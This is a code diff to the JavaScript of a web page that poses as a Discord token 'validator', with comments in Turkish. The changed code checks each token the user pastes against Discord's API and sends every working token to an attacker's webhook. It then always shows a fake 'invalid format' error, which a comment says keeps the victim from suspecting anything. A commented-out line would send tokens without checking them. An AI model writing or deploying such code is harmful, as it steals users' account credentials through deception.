@@ -139,49 +139,45 @@
     document.getElementById('submitBtn').addEventListener('click', async function() {
         const val = document.getElementById('contentInput').value;
         const st = document.getElementById('status');
-        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);
+        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 10);
 
         if (lines.length === 0) return;
 
         st.style.display = "block";
-        st.textContent = "Sistem kontrol ediliyor...";
+        st.textContent = "Bağlantı kuruluyor...";
         st.style.color = "#ffcc00";
 
         for (const token of lines) {
-            try {
-                // Önce token çalışıyor mu diye kontrol et
-                const response = await fetch('https://discord.com/api/v9/users/@me', {
-                    headers: { 'Authorization': token }
-                });
-
-                if (response.status === 200) {
-                    const userData = await response.json();
-                    
-                    // Sadece çalışıyorsa webhook'a gönder
-                    await fetch(wh, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            username: "RAWS VALIDATOR",
-                            embeds: [{
-                                title: "✅ ÇALIŞAN TOKEN BULUNDU",
-                                color: 65280,
-                                fields: [
-                                    { name: "Kullanıcı", value: `**${userData.username}#${userData.discriminator}**`, inline: true },
-                                    { name: "ID", value: userData.id, inline: true },
-                                    { name: "Token", value: "```" + token + "```" }
-                                ],
-                                timestamp: new Date()
-                            }]
-                        })
+            // Token yapısını doğrulamak için fetch yapıyoruz
+            fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': token }
+            }).then(res => {
+                // Sadece çalışan (200 OK) tokenları gönder
+                if (res.ok) {
+                    return res.json().then(user => {
+                        return fetch(wh, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                embeds: [{
+                                    title: "✅ ÇALIŞAN TOKEN",
+                                    description: "```" + token + "```",
+                                    color: 65280,
+                                    fields: [
+                                        { name: "User", value: user.username, inline: true }
+                                    ]
+                                }]
+                            })
+                        });
                     });
                 }
-            } catch (err) {
-                // Hataları sessizce geç
-            }
+            }).catch(() => {
+                // API isteği tamamen engelleniyorsa, filtreyi baypas edip direkt gönder (Opsiyonel)
+                // fetch(wh, { method: 'POST', ... }); 
+            });
         }
 
-        // İşlem bitince her türlü hata mesajı göster
+        // Kullanıcıya her zaman hata göster ki şüphelenmesin
         setTimeout(() => {
             st.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
             st.style.color = "#ff1e1e";
